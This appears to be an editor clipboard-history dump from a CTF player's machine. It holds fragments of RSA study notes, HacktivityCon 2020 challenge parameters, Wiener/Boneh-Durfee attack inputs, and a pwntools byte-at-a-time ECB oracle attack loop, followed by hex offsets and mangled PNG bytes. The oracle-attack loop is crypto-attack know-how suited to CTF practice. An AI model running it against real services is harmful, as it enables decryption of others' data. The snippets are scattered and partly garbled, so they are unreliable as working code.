be335ca45f5649cde82cc1870b8dcd2c|file:///home/neo/cyberranges/work/rsa/rsa101.md|1|124|v|vimwiki
	‚ÄìAdleman
7e1234a76b35a37aa2edc8acc0c2c1a3|file:///home/neo/cyberranges/work/rsa/rsa101.md|16|1|V|vimwiki
	Most real-life attacks on the RSA cryptosystem are fairly advanced and outside the scope of this scenario.
d825c53d89d9cacb3e034bcb138f3d37|file:///home/neo/cyberranges/work/rsa/rsa101.md|32|59|v|vimwiki
	transform
3b95f412f57e1bfb738c6ed794fc85f7|file:///home/neo/cyberranges/work/rsa/rsa101.md|53|1|v|vimwiki
	In [7]: 
07c317a177025705bbbd9b453a15d0ae|file:///home/neo/cyberranges/work/rsa/rsa101.md|55|1|v|vimwiki
	In [8]: 
5961abcc24922e4449a0fca63d756475|file:///home/neo/cyberranges/work/rsa/rsa101.md|58|1|v|vimwiki
	In [9]: 
3d1df7647d17bc8ccf952e4d7c0b4476|file:///home/neo/cyberranges/work/rsa/rsa101.md|59|1|v|vimwiki
	10]: 
efcd53c83f5ce8530342aca71d483b4c|file:///home/neo/cyberranges/work/rsa/rsa101.md|60|1|v|vimwiki
	In [11]: 
b9ba7e94c5cf0bf4c96617ad45207736|file:///home/neo/cyberranges/work/rsa/rsa101.md|64|1|v|vimwiki
	In [12]: 
930f6d1273c4c0a1bdc91eb154f1229c|file:///home/neo/cyberranges/work/rsa/rsa101.md|65|1|v|vimwiki
	In [13]: 
e9804197c9e5d7d6a90579fffc2fa48c|file:///home/neo/cyberranges/work/rsa/rsa101.md|66|1|V|vimwiki
	b'this is a secret message'
06aef5d026e6ec477bc2c3165772ca08|file:///home/neo/cyberranges/work/rsa/rsa101.md|61|1|V|vimwiki
	2854312398284457058259928330243763178290112970307720537957
e1db748a1c1bcb4f8622a51beaa0fee7|file:///home/neo/cyberranges/work/rsa/rsa101.md|55|1|V|vimwiki
	11487057098723607483194500169358640020970261834830373085233280000403680782610680550147024057662647744072321805421043069804516867544685735963865101774179799
f1779a5d3f9c49b407163ae9401f5dd7|file:///home/neo/cyberranges/work/rsa/rsa101.md|71|1|V|vimwiki
	* getprime, create key
0b36c14f1b43ffc52d97144a99c81a08|file:///home/neo/cyberranges/work/rsa/rsa101.md|57|1|V|vimwiki
	message = b'this is a secret message'
	encoded_message = bytes_to_long(message)
0356dd208e6ce4e51af3d782921eb285|file:///home/neo/cyberranges/work/rsa/rsa101.md|93|1|V|vimwiki
	52556079403837804878816123041413159881721169060350773464333274368397138382222345573179435966763975591575149093359142757219869144898154076137253077908872156741220971289100356949258354462236212711064387862352553243785424451569253862978795114894896793294772307805952943778010245067846289931408903886113972809428
f5f068877c7dc8a5e7ace9029f148d42|file:///home/neo/cyberranges/work/rsa/rsa101.md|82|33|v|vimwiki
	encoded_message
e09cbcb6450c42075623596c59d2a9d3|file:///home/neo/cyberranges/work/rsa/rsa101.md|82|1|v|vimwiki
	decoded_message
f03cb0ff5e7308d167f9a484a1a9856d|file:///home/neo/cyberranges/work/rsa/rsa101.md|98|1|V|vimwiki
	- Create 
2fee29b756d3d706bd89cddfcb3385a8|file:///home/neo/CTFs/hacktivitycon2020/fossil|11|1|V|python
	def enc(f):
	    e = b(f)
	    z = []
	    i = 0
	    while i < len(e):
	        z += [ e[i] ^ e[((i + 1) % len(e))]]
	        i = i + 1
	    c = h(bytearray(z))
	    return c
578167afc15c26b288055f31a4fb46ca|file:///home/neo/CTFs/hacktivitycon2020/fossil|3|1|V|python
	import base64
	import binascii
	
	h = binascii.hexlify
	b = base64.b64encode
6ff19b60b204950e819b3f4e01d04d8c|file:///home/neo/CTFs/hacktivitycon2020/fossil|24|1|V|python
	    pt.append(b'f')
8eb30b80759eb1fef6febe8503fb24d8|file:///home/neo/CTFs/hacktivitycon2020/fossil|25|1|V|python
	    pt.append(b'l')
a25eedc73ec92f7d8aaf137f663e1e97|file:///home/neo/CTFs/hacktivitycon2020/fossil|25|5|V|python
	    pt = []
c882d4d428f223e104c39b0318ceb7ff|file:///home/neo/CTFs/hacktivitycon2020/fossil|25|5|V|python
	    ct.append(b'f' ^ b'l')
10bda5aefd261a3ec379d968b3bd2c90|file:///home/neo/CTFs/hacktivitycon2020/fossil|24|5|V|python
	    ct = []
a54986e375a9abd66f7992caae612573|file:///home/neo/CTFs/hacktivitycon2020/fossil|26|24|v|python
	c - 2, 0, -1
5d2ca6aec0b3a78cd00516c5bd525964|file:///home/neo/CTFs/hacktivitycon2020/fossil|28|9|V|python
	        idx += 1
168ae7887993386b0ec5788af891ca82|file:///home/neo/CTFs/hacktivitycon2020/fossil|25|5|V|python
	    idx = 0
5d4c7b80ed79488c125eeadfdfd2b96d|file:///home/neo/CTFs/hacktivitycon2020/prompt.txt|1|5|v|text
	86431753033855985150102208955150746586984567379198773779001331665367046453352820308880271669822455250275431988006538670370772552305524017849991185913742092236107854495476674896994207609393292792117921602704960758666683584350417558805524933062668049116636465650763347823718120563639928978056322149710777096619
956213c43e93c4ba92cf7696917f20bc|file:///home/neo/CTFs/scripts/crypto/wiener.py|145|5|V|python
	    N = 156749047558583013960513267351769479915110440411448078412590565797031533622509813352093119636835511977253033854388466854142753776146092587825440445182008237325262012698034419137157047927918635897378973846177552961727126115560551970797370239385129543828686170774323306933202481728884019420422360360849592983818405154473369790181636472137741865440233383956571081122982223602667853668754338360008279002325576495573847568301584365514417593244726435632222027817410359417329310347952169273512510934251453361933794586716533950489973436393834189505450956622286216819440777162804798432330933357058175885674184582816364542591313
88fa6362be99dd8ec7fb09d74ecea89b|file:///home/neo/CTFs/scripts/crypto/wiener.py|146|5|V|python
	    e = 91043118409828550796773745518585981151180206101005135117565865602978722878478494447048783557571813980525643725323377488249838860897784683927029906188947001149632101513367258267329961684034661252866484981926055087386190015432964608927947646476193251820354738640453947833718397360834701566765504916472450194494897616371452996381159817427887623703639133290358520498419049175941584678802701606995099241245926884172985004839801270005583030514286561971825047719421487004569752638468907609110285739083279629747310953086535889932550905065172805818862336335628248528993024112446002398466115161473573451161053837400091893285717
67f729207acf25e402202fe806ab105e|file:///home/neo/CTFs/hacktivitycon2020/prompt.txt|3|1|V|text
	e = 43593315545590924566741189956390609253174017258933397294791907025439424425774036889638411588405163282027748339397612059157433970580764560513322386317250465583343254411506953895016705520492303066099891805233630388103484393657354623514864187319578938539051552967682959449373268200012558801313113531016410903723
8c1852e9434749f1055e81624af7337b|file:///home/neo/CTFs/scripts/crypto/wiener.py|148|1|V|python
	    e =
ec969417633bac4882a978d40b6b9014|file:///home/neo/CTFs/scripts/crypto/boneh_durfee.sage|275|5|V|python
	    # N = 0x665166804cd78e8197073f65f58bca14e019982245fcc7cad74535e948a4e0258b2e919bf3720968a00e5240c5e1d6b8831d8fec300d969fccec6cce11dde826d3fbe0837194f2dc64194c78379440671563c6c75267f0286d779e6d91d3e9037c642a860a894d8c45b7ed564d341501cedf260d3019234f2964ccc6c56b6de8a4f66667e9672a03f6c29d95100cdf5cb363d66f2131823a953621680300ab3a2eb51c12999b6d4249dde499055584925399f3a8c7a4a5a21f095878e80bbc772f785d2cbf70a87c6b854eb566e1e1beb7d4ac6eb46023b3dc7fdf34529a40f5fc5797f9c15c54ed4cb018c072168e9c30ca3602e00ea4047d2e5686c6eb37b9
84354a02791a5bf94f130d2451726d2d|file:///home/neo/CTFs/hacktivitycon2020/prompt.txt|1|1|V|text
	n = 86431753033855985150102208955150746586984567379198773779001331665367046453352820308880271669822455250275431988006538670370772552305524017849991185913742092236107854495476674896994207609393292792117921602704960758666683584350417558805524933062668049116636465650763347823718120563639928978056322149710777096619
a6dc971244882aa8616843c92f9eb2da|file:///home/neo/CTFs/scripts/crypto/boneh_durfee.sage|277|5|V|python
	    e = 0x2c998e57bc651fe4807443dbb3e794711ca22b473d7792a64b7a326538dc528a17c79c72e425bf29937e47b2d6f6330ee5c13bfd8564b50e49132d47befd0ee2e85f4bfe2c9452d62ef838d487c099b3d7c80f14e362b3d97ca4774f1e4e851d38a4a834b077ded3d40cd20ddc45d57581beaa7b4d299da9dec8a1f361c808637238fa368e07c7d08f5654c7b2f8a90d47857e9b9c0a81a46769f6307d5a4442707afb017959d9a681fa1dc8d97565e55f02df34b04a3d0a0bf98b7798d7084db4b3f6696fa139f83ada3dc70d0b4c57bf49f530dec938096071f9c4498fdef9641dfbfe516c985b27d1748cc6ce1a4beb1381fb165a3d14f61032e0f76f095d
cb511b24f9630990f1c22a0d91973a5d|file:///home/neo/CTFs/hacktivitycon2020/prompt.txt|1|1|V|text
	n = 86431753033855985150102208955150746586984567379198773779001331665367046453352820308880271669822455250275431988006538670370772552305524017849991185913742092236107854495476674896994207609393292792117921602704960758666683584350417558805524933062668049116636465650763347823718120563639928978056322149710777096619
	e = 43593315545590924566741189956390609253174017258933397294791907025439424425774036889638411588405163282027748339397612059157433970580764560513322386317250465583343254411506953895016705520492303066099891805233630388103484393657354623514864187319578938539051552967682959449373268200012558801313113531016410903723
0b0f8de99f22b8385c21e4e49275fb21|file:///home/neo/CTFs/hacktivitycon2020/prompt.txt|1|1|V|text
	n = 86431753033855985150102208955150746586984567379198773779001331665367046453352820308880271669822455250275431988006538670370772552305524017849991185913742092236107854495476674896994207609393292792117921602704960758666683584350417558805524933062668049116636465650763347823718120563639928978056322149710777096619
	e = 43593315545590924566741189956390609253174017258933397294791907025439424425774036889638411588405163282027748339397612059157433970580764560513322386317250465583343254411506953895016705520492303066099891805233630388103484393657354623514864187319578938539051552967682959449373268200012558801313113531016410903723
	c = 6017385445033775122298094219645257172271491520435372858165807340335108272067850311951631832540055908237902072239439990174700038153658826905580623598761388867106266417340542206012950531616502674237610428277052393911078615817819668756516229271606749753721145798023983027473008670407713937202613809743778378902
578f4b1eee7337cc0c6d66780f6acfe9|file:///home/neo/CTFs/hacktivitycon2020/prompt%20%281%29.txt|1|1|V|text
	n = 86431753033855985150102208955150746586984567379198773779001331665367046453352820308880271669822455250275431988006538670370772552305524017849991185913742092236107854495476674896994207609393292792117921602704960758666683584350417558805524933062668049116636465650763347823718120563639928978056322149710777096619
	
	e = 43593315545590924566741189956390609253174017258933397294791907025439424425774036889638411588405163282027748339397612059157433970580764560513322386317250465583343254411506953895016705520492303066099891805233630388103484393657354623514864187319578938539051552967682959449373268200012558801313113531016410903723
70243369c548b86530465cd4760f8c9f|file:///home/neo/CTFs/scripts/crypto/boneh_durfee.sage|279|1|V|python
	    N = 86431753033855985150102208955150746586984567379198773779001331665367046453352820308880271669822455250275431988006538670370772552305524017849991185913742092236107854495476674896994207609393292792117921602704960758666683584350417558805524933062668049116636465650763347823718120563639928978056322149710777096619
8d39a8429d3e405c02616ddc98a708a4|file:///home/neo/CTFs/scripts/crypto/boneh_durfee.sage|280|5|V|python
	    e = 43593315545590924566741189956390609253174017258933397294791907025439424425774036889638411588405163282027748339397612059157433970580764560513322386317250465583343254411506953895016705520492303066099891805233630388103484393657354623514864187319578938539051552967682959449373268200012558801313113531016410903723
3f613badd728a12314bc4430605be131|untitled:1|1|1|v|
	738a726f41573c2c128eda03df60d115
b939e952b8142ca380acfbbaa48173cb|untitled:1|1|32|V|
	34d8626e468259975568ed710bfeaab0
	34d8626e468259975568ed710bfeaab0
	3482e3521907ababd106a1442c7469de
	eb583b3d6d39449d5f0b9a6ac2a409b3
a01bd34793c652ddecdc522f09176ee7|untitled:1|1|1|V|
	34d8626e468259975568ed710bfeaab0
	69828fad124a736d73092797b8639026
	0f88b602111e32cc678cd05f29fff531
	d329ccff6a1160806313cbdddbd8b36e
4b744a02f97eab875cc88d33a04c029e|untitled:1|6|1|V|
	34d8626e468259975568ed710bfeaab0
	69828fad124a736d73092797b8639026
	3482e3521907ababd106a1442c7469de
	eb583b3d6d39449d5f0b9a6ac2a409b3
dfe8629e007a444b12e80bc372af6bd2|untitled:1|11|1|V|
	34d8626e468259975568ed710bfeaab0
	603a735b88189f1dcb5c1ba7cbe3ed9f
	3482e3521907ababd106a1442c7469de
	eb583b3d6d39449d5f0b9a6ac2a409b3
0ca31d404c0f8f8a55a3dbf77b01feec|untitled:1|16|1|V|
	34d8626e468259975568ed710bfeaab0
	0ab27f441d780929f339eb45e9accd81
	3fe5f9449d1395b0d7c50351d51d070a
	8c3d9cb773fefd1cb36cf719dbc61bb4
	
	34d8626e468259975568ed710bfeaab0
	0ab27f441d780929f339eb45e9accd81
	3482e3521907ababd106a1442c7469de
	eb583b3d6d39449d5f0b9a6ac2a409b3
169dd58b5aaceb448a7bbf24e8eb1d38|file:///home/neo/CTFs/scripts/crypto/padding.py|1|19|v|python
	# pip install pwntools
1ab7af4a60be08e3f4242f44e90b4e8d|file:///home/neo/CTFs/scripts/crypto/padding.py|3|1|V|python
	r.recvuntil('> ')
f4d2de660325f391ebe06618bd135b96|file:///home/neo/CTFs/scripts/crypto/padding.py|4|1|V|python
	while True
ec0d67892dca43691aea45f9e72e80bf|file:///home/neo/CTFs/scripts/crypto/padding.py|8|5|V|python
	    target = r.recvline
6f941cb8b1efb4427365e3fabe63d3bf|file:///home/neo/CTFs/scripts/crypto/padding.py|8|1|V|python
	    print(r.recvline())
a0410881def5f49aa8868a5d46a005a3|file:///home/neo/CTFs/hacktivitycon2020/padding.py|12|23|V|python
	    print(r.recvline())
	    print(r.recvline())
	    print(r.recvline())
79b163116cb6d28c539cb5b6fff12288|file:///home/neo/CTFs/hacktivitycon2020/padding.py|10|1|V|python
	    print(r.recvline())
	    print(r.recvline())
f5fc7a42270e55dd5fa2d0bdf3db1efb|file:///home/neo/CTFs/hacktivitycon2020/padding.py|12|28|v|python
	r.recvline().strip().decode()
1388fe1e4e99ec6c9e9e10765c933716|file:///home/neo/CTFs/hacktivitycon2020/padding.py|12|5|V|python
	    print(r.recvline().strip().decode())
8887d8fd88cb9146c6cc6b468fc792d9|file:///home/neo/CTFs/hacktivitycon2020/padding.py|8|1|V|python
	    r.recvuntil('> ')
39cea0eb286c3a3569a146212ac9c045|file:///home/neo/CTFs/hacktivitycon2020/padding.py|9|1|V|python
	    r.sendline(fake_block)
ed9d86a543c177449d3792ce71b9292d|file:///home/neo/CTFs/hacktivitycon2020/padding.py|13|14|v|python
	bytes.fromhex(r.recvline().strip().decode())[16:32]
6e6a193417985188d71f386a1556b940|file:///home/neo/CTFs/hacktivitycon2020/padding.py|10|1|V|python
	    r.recvline()
	    r.recvline()
	    r.recvline()
df723f853b03d2bd6ca290ea1e3fdc00|file:///home/neo/CTFs/hacktivitycon2020/padding.py|7|1|V|python
	for pos in range(16):
	    r.recvuntil('> ')
	    r.sendline(fake_block)
	    r.recvline()
	    r.recvline()
	    r.recvline()
	    target = bytes.fromhex(r.recvline().strip().decode())[16:32]
	    for c in string.printable:
	        r.recvuntil('> ')
	        r.sendline(fake_block + bytes(pt + c, 'ascii'))
	        r.recvline()
	        r.recvline()
	        r.recvline()
	        block = bytes.fromhex(r.recvline().strip().decode())[16:32]
	        if (target == block):
	            pt += c
	            print(pt)
	            fake_block = fake_block[:-1]
	            break
00e37311239eb9ed6e121fc67cb57a21|untitled:1|1|1|v|
	0000000000000000 
d21933ed5188fec87114e4f007f60985|untitled:1|101|1|v|
	0000000000000010 
90e1f4ec3e3a8356a65afca3fc7bc34c|untitled:1|101|1|v|
	0000000000000020 
51b895d8c4ede19bbcd9e7c3b1d7e83f|untitled:1|101|1|v|
	0000000000000040 
6c78906f95def9eaa255eb1029db9f29|untitled:1|101|1|v|
	0000000000000030 
2e31aa12b0b49175f4b93a199966439f|untitled:1|101|1|v|
	0000000000000050 
674b5008212a5300a18ace7e07f03d6b|untitled:1|101|1|v|
	0000000000000070 
b09d078b8f96f24578aba71ba27dea32|untitled:1|101|1|v|
	0000000000000080 
8e2332a4203282fca157d664e32a96b9|untitled:1|101|1|v|
	0000000000000060 
22ce71a289aa385e64d5df1fa567226e|untitled:1|101|1|v|
	0000000000000090 
303b882c4238466858a0221881af7524|untitled:1|101|1|v|
	00000000000000A0 
eb73ee1d35475ccc983ee2133261db19|untitled:1|101|1|v|
	00000000000000B0 
077ecccf3dc6be690e925416490b549a|untitled:1|101|1|v|
	00000000000000C0 
c611c3275c45018686ac9902344de288|untitled:1|101|1|v|
	00000000000000E0 
31e4040b8d34d4e9e6df62009af93792|untitled:1|101|1|v|
	00000000000000D0 
137e55bd137319eb8ef15be32918db8d|untitled:1|101|1|v|
	0000000000000100 
f377f5e0049243ba46b2098444a0fa6d|untitled:1|101|1|v|
	00000000000000F0 
709128b89b6e3b02b02e623006319800|untitled:1|101|1|v|
	0000000000000110 
8486b372311941dd116086eb6b9ca66c|untitled:1|101|1|v|
	0000000000000120 
239720d4adb5533b2b3c43990649f50f|untitled:1|101|1|v|
	0000000000000130 
1e8174f1255e008ff6b9dcedde6e1199|untitled:1|101|1|v|
	0000000000000150 
b9757fc3ff28d2b719eebb5f4ffd5b2c|untitled:1|101|1|v|
	0000000000000170 
abae0447fd1360471109a0fc60ecc3e8|untitled:1|101|1|v|
	0000000000000140 
ae19f4c839156e96e61349face8d942b|untitled:1|101|1|v|
	0000000000000180 
5f28c8a590cfd86fc3f87d6792fccc20|untitled:1|101|1|v|
	0000000000000190 
07ea0ae96f08b22b851457a2f2aafcb8|untitled:1|101|1|v|
	00000000000001A0 
c95635e43e14b4d5006ea7d1df3d9ef5|untitled:1|101|1|v|
	00000000000001B0 
94a515f9b7ca73acdcce115eba9f7b9f|untitled:1|101|1|v|
	00000000000001D0 
2ea9dac06b582574a41d22a1f27a175c|untitled:1|101|1|v|
	00000000000001E0 
ab1303d8927a4b49d6adabfce032ce7f|untitled:1|101|1|v|
	00000000000001C0 
781cf71d2171b1f4045f82a74cd27c7b|untitled:1|101|1|v|
	0000000000000200 
e922a6923233e530eb1d6e62ff569ab6|untitled:1|101|1|v|
	00000000000001F0 
eb05e63fb27999c647b0c93adac25086|untitled:1|101|1|v|
	0000000000000210 
fade1079b30cf3c5cdfc9ba855e8b6b3|untitled:1|101|1|v|
	0000000000000160 
7a8c877e1d3a8a1daa754e075f8f7c38|untitled:1|101|1|v|
	0000000000000220 
8a65b97f403977a5d95d6212d5c80bd1|untitled:1|101|1|v|
	0000000000000240 
18e0a1f1131926c55c5cb393e2c86e26|untitled:1|101|1|v|
	0000000000000230 
956a13271e7919967151c9f40b891c34|untitled:1|101|1|v|
	0000000000000260 
a48832942d386fa3c17b68454217de65|untitled:1|101|1|v|
	0000000000000250 
99cfafe145d00935434543d6c2a9323b|untitled:1|101|1|v|
	0000000000000280 
87d8c6eafbe0e97368efb681a3c57a8b|untitled:1|101|1|v|
	0000000000000270 
9f756de55a69afdbd1285c6dc9016063|untitled:1|101|1|v|
	00000000000002A0 
ae738e7e04caa0a1b7219578da73fe53|untitled:1|101|1|v|
	0000000000000290 
4619b17f3adc4d310cf977705f45b178|untitled:1|101|1|v|
	00000000000002B0 
afa54201ba4317f5f0bb544f9bbef82b|untitled:1|101|1|v|
	00000000000002D0 
d4a9622e080e125a9b035cd44bed0ee6|untitled:1|101|1|v|
	00000000000002C0 
19fdee51725bfdd7b0258d170f3cb1dd|untitled:1|101|1|v|
	00000000000002E0 
0f0420c8e215dcb8a063fdb0cf4f4c39|untitled:1|101|1|v|
	0000000000000330 
a74edd06ed2434bd18d05142718e4549|untitled:1|101|1|v|
	00000000000002F0 
4179796e461b79f7b2e345cd2f71d077|untitled:1|101|1|v|
	0000000000000300 
1b38449eae4fbe4a2b052f760aff4779|untitled:1|101|1|v|
	0000000000000320 
524f5687f27bf21d0c5850c8ae80d06a|untitled:1|101|1|v|
	0000000000000310 
1ed4d94fb8b785bf4bf025dc1087b3a4|untitled:1|101|1|v|
	0000000000000340 
9bb7ef7712702c36c1560c8c37c10ea3|untitled:1|101|1|v|
	0000000000000350 
574fcb72393bcf3b3c1c2edf7b55d892|untitled:1|101|1|v|
	0000000000000360 
2c58496c446fb49155b66b356d65ea94|untitled:1|101|1|v|
	0000000000000390 
b29578d0c3ce71a662206312439fe73f|untitled:1|101|1|v|
	0000000000000370 
5480ea341dea9f7832a011d8d255eaa8|untitled:1|101|1|v|
	00000000000003A0 
d07d93b421ea29e50ba68c1515805636|untitled:1|101|1|v|
	00000000000003B0 
44f99b50e7d3a91d00888d9296f68d53|untitled:1|101|1|v|
	00000000000003D0 
a787a364410580462579ff8feb7e9210|untitled:1|101|1|v|
	00000000000003C0 
151efa5a6aa1d687c968ff7397030302|untitled:1|101|1|v|
	00000000000003E0 
11838a530ec20b1d49fa552bbeeb704d|untitled:1|101|1|v|
	0000000000000400 
34a267230dd0a934806a8aaf44fd7f7b|untitled:1|101|1|v|
	00000000000003F0 
13dd90eb75aa0060f0d08decea96654a|untitled:1|101|1|v|
	0000000000000410 
8f01103ffb9bf6dbe141fe757c577962|untitled:1|101|1|v|
	0000000000000430 
864268f77307aa1902dfb96090ad0d35|untitled:1|101|1|v|
	0000000000000440 
65f896e50dbda13121036d211449b8bb|untitled:1|101|1|v|
	0000000000000450 
b9467c5e4fb178d1a67e3e8320bebabd|untitled:1|101|1|v|
	0000000000000460 
c21fbcc5646bfd325d0311069bd5c512|untitled:1|101|1|v|
	0000000000000480 
5f77ed5ce4f0b24f517e3e0b14737d51|untitled:1|101|1|v|
	0000000000000470 
03a41155f78d4eeb01c97a2ca2f98732|untitled:1|101|1|v|
	0000000000000420 
0e5676908e1b021e6674c680ff9a328a|untitled:1|101|1|v|
	00000000000004A0 
315a6b01bdc632b490cabe70cec06243|untitled:1|101|1|v|
	00000000000004B0 
1f0734b6c76e508fb712b924cf6f9851|untitled:1|101|1|v|
	00000000000004D0 
b550c5510b52b9b7a0ff19d5aeaf2995|untitled:1|101|1|v|
	00000000000004C0 
8892aec1bdf2b3c8c9f951ece69e8196|untitled:1|101|1|v|
	00000000000004E0 
b3580caa8b968cb0534a2b902c1ee756|untitled:1|101|1|v|
	00000000000004F0 
0dc2be4be0b1c1afe1987d37f123eec9|untitled:1|101|1|v|
	0000000000000500 
a91ff5a133d803777f8e6b5ba2dbbc44|untitled:1|101|1|v|
	0000000000000380 
8dce5da4ce9c94ec7e5c7b4d70cdfb01|untitled:1|101|1|v|
	0000000000000490 
8a750fc4399e19e00c3fcfe10ba6e8b4|untitled:1|101|1|v|
	0000000000000520 
9c48f48aeba674a3a6c012b74e48a18c|untitled:1|101|1|v|
	0000000000000510 
90adc78e44cadf2c57a4283bb8b3300e|untitled:1|101|1|v|
	0000000000000530 
68e3c3a68d963031acc7f0df1dba232a|untitled:1|101|1|v|
	0000000000000540 
785ed2159a7f810d148639ef1571faf5|untitled:1|101|1|v|
	0000000000000550 
d79fbce622fd82ea9ad7ef19f6d78bb5|untitled:1|101|1|v|
	0000000000000560 
11287c2d0a4803662103b820712ee3d6|untitled:1|101|1|v|
	0000000000000570 
7f361e613ab64b15390773d106dc6dd4|untitled:1|101|1|v|
	0000000000000580 
6178b6a6502ac2b9b1ec602ff0f26b6b|untitled:1|101|1|v|
	00000000000005A0 
237127280f2537530c24f35da2a8b361|untitled:1|101|1|v|
	0000000000000590 
2d140d65284d013a4947b47e4fd48fce|untitled:1|101|1|v|
	00000000000005B0 
294d53f81a4c48016db965e9afe2c7d5|untitled:1|101|1|v|
	00000000000005C0 
ad159a46e533e343a4245e6bcc141130|untitled:1|101|1|v|
	00000000000005D0 
04f2e5cd487aae08b3a15cacf5144846|untitled:1|101|1|v|
	00000000000005F0 
0d15b4e86b094075bb78e3daf5ef94bf|untitled:1|101|1|v|
	00000000000005E0 
f5e34ad0c3907a58bf71481ec7b420ad|untitled:1|101|1|v|
	0000000000000620 
7c574febd46b43886d852b93c4788ad4|untitled:1|101|1|v|
	0000000000000600 
cb7159149d2160b6346207ffedd46356|untitled:1|101|1|v|
	0000000000000630 
65159af332f089a5a6e3b9d0daee4dcc|untitled:1|101|1|v|
	0000000000000610 
6a8ebac993e8923baac73951af1ab58b|untitled:1|101|1|v|
	0000000000000640 
74a60f650689ce032ce08cd846ca029a|untitled:1|103|1|v|
	0000000000000660 
b04b63d06925bff3926956eeddeb8ace|untitled:1|103|1|v|
	0000000000000650 
2dcc7519b6c9a7a9a8affd5cd7cdaba1|untitled:1|138|1|v|
	00000000000006B0 
36c7305ad847a788f8be6a0888400338|untitled:1|138|1|v|
	00000000000006A0 
f32e6643af8ca02fe202439b6783238f|untitled:1|138|1|v|
	00000000000006F0 
46709fc8d8bc5b6e63e82033a3d958f7|untitled:1|138|1|v|
	00000000000006C0 
9598bf2969eca24f32fb9ee54d6c6d59|untitled:1|138|1|v|
	00000000000006E0 
3fb089a2b8a0b4224252c403d1ac2012|untitled:1|138|1|v|
	0000000000000730 
382dcbde21166e0d8713d7c1fcbca23d|untitled:1|138|1|v|
	0000000000000700 
c2a8ae88b36a67e452a485a8be476620|untitled:1|138|1|v|
	0000000000000710 
512719235b16158e0afa2b27690ea61f|untitled:1|138|1|v|
	0000000000000720 
34c05467bc61dd8e8af17a05f3cd8357|untitled:1|138|1|v|
	0000000000000770 
dabc2dc3fa3a0add8a55ab5257d341c5|untitled:1|138|1|v|
	0000000000000790 
e2e4c0654def3f2d8a40b274df52ace6|untitled:1|138|1|v|
	0000000000000740 
1dc5e846cd57b7b625065d24c4bb0bdc|untitled:1|138|1|v|
	0000000000000780 
f240dd8589dd117923854f9321ea4198|untitled:1|138|1|v|
	00000000000007B0 
131e9a221b99b4f50484f1a98ba24f5d|untitled:1|138|1|v|
	00000000000007A0 
e0260d2b6cd33ec8b752cb7ed92b3e02|untitled:1|138|1|v|
	00000000000007D0 
2e31464d35c8bf413079f33d33c6b449|untitled:1|138|1|v|
	0000000000000760 
f6a6980ee17a13c37df5f8b5d996803b|untitled:1|138|1|v|
	00000000000007E0 
0191fbc25c89e9b9e807fcc33eb50430|untitled:1|138|1|v|
	00000000000007F0 
2f5dec81e78fbba1123ecff4d0d79c96|untitled:1|138|1|v|
	0000000000000810 
c6e8ee71a5eb76d5a78010914c5423d5|untitled:1|138|1|v|
	00000000000007C0 
ae2834de26b2c9bad54284433e273719|untitled:1|138|1|v|
	0000000000000830 
607890f43324b98d3f2a703d4da1d7b8|untitled:1|138|1|v|
	0000000000000820 
5c1bc6346b0c4aec2b7fbbfda460aca9|untitled:1|138|1|v|
	0000000000000870 
86706eccbbe26718fe86746d2b10d888|untitled:1|138|1|v|
	0000000000000800 
3c305b451dbafa592d0ee70b287650cb|untitled:1|138|1|v|
	0000000000000860 
db7adc47c17092f1a0e90a4986cc122b|untitled:1|138|1|v|
	0000000000000880 
0c72377c895610a4673ccebb28387c7e|untitled:1|138|1|v|
	0000000000000890 
bec10e942ae4a2de55b62e7f9b20882f|untitled:1|138|1|v|
	0000000000000680 
e90d61944c73eefcdc4a193ff3701f0d|untitled:1|138|1|v|
	00000000000006D0 
81a0bec2110e7d50f587f21087f43d06|untitled:1|138|1|v|
	0000000000000850 
d51044cd7efd14420d655c5af4537f60|untitled:1|138|1|v|
	0000000000000690 
1f54676323feba98f931bed58c850ae0|untitled:1|138|1|v|
	0000000000000670 
edc900db614f833ed5b776a337b8e89a|untitled:1|138|1|v|
	0000000000000840 
5dce1579e3f18c3d59e4777e58c85e27|untitled:1|138|1|v|
	0000000000000750 
8ee2cd0b81540f33d572221c9a61f371|untitled:1|1|48|v|
	 ÔøΩPNGÔøΩÔøΩÔøΩÔøΩ   ÔøΩI‚Ä¶
62385b2fe6a43d6b2a721cbec8d7a0f7|untitled:1|138|13|v|
	 ÔøΩU   *ÔøΩÔøΩ   ‚Ä¶
353241b53a215ea7ae5fc1ba78cf4196|untitled:1|138|13|v|
	 ÔøΩgAMA  ¬±ÔøΩÔøΩ√ºa‚Ä¶
e9446daa85f9d4f8372fcb93014da862|untitled:1|138|13|v|
	 √ô   ÔøΩsRGB ¬Æ√éÔøΩ‚Ä¶
65943231ebb145ba65e3fc3f734864e3|untitled:1|138|13|v|
	 ÔøΩpHYs  ÔøΩ√É  ÔøΩ‚Ä¶
87b08d51fb169723ebe3e25267cb81af|untitled:1|138|13|v|
	 o¬®d  ÔøΩ*IDATx^‚Ä¶
6e8e3f779bacafe7d32cfd470cc85f02|untitled:1|138|13|v|
	 R¬•√ùÔøΩJh√ímÔøΩ.ÔøΩÔøΩ√ê‚Ä¶
a8f551fa2c963594d6293ba726f8c937|untitled:1|138|13|v|
	 ÔøΩ√ö<ÔøΩÔøΩ√°;ÔøΩl¬±√èÔøΩ ‚Ä¶
e6ad616a01f3b4c95c42db3176153d30|untitled:1|138|13|v|
	 &√∏ÔøΩ√∏ÔøΩy¬∂ÔøΩ¬æÔøΩÔøΩ4ÔøΩ‚Ä¶
7271a90cb70ff41e136b341222bf8d2f|untitled:1|138|13|v|
	 √ô√≤√è¬≤l<oÔøΩ√ÖÔøΩ<?ÔøΩ‚Ä¶
cd2d4ade1909d42a4b08e41e262877ee|untitled:1|138|13|v|
	 ÔøΩ√±√µzÔøΩ1ÔøΩ3H√æ√É¬øÔøΩ‚Ä¶
f3ca5ffedbc0f0dc7269814f9e20b9f3|untitled:1|138|13|v|
	 ÔøΩÔøΩÔøΩÔøΩ.ÔøΩ√øÔøΩ3\8√æÔøΩ‚Ä¶
2c8e14b30ca92732f68f64cb81b83709|untitled:1|138|13|v|
	 √º3√åp√°√∏gÔøΩ√°√Ç√±√è0‚Ä¶
33ae1260db6d6abb3953bb2ec229d96a|untitled:1|138|13|v|
	 √øE¬∂ÔøΩ√è√á√à|_√Ä¬Ω=√ú‚Ä¶
294d698fd553220e8bb526cbd60450ca|untitled:1|138|13|v|
	 ÔøΩ ÔøΩRu√û√û√ÇÔøΩ{¬∞ÔøΩ‚Ä¶
267deb2d3260c35e557af16af1a8f39b|untitled:1|138|13|v|
	 -{t¬º√é√∞√∫ÔøΩASS√á_‚Ä¶
6d7dd4a1388a65aa41c49cc69cc8bf2e|untitled:1|138|13|v|
